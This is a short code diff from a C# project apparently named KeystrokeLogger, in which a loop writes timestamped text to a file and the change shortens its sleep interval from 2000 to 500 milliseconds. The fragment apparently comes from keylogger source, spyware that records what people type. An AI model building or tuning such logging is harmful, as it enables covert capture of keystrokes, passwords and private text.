@@ -62,7 +62,7 @@ namespace KeystrokeLogger
                     file.WriteLine("time:" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff"));
                     file.WriteLine(txt);
                     file.Close();
-                    Thread.Sleep(2000);
+                    Thread.Sleep(500);
                 }
             }
             catch (Exception ex)
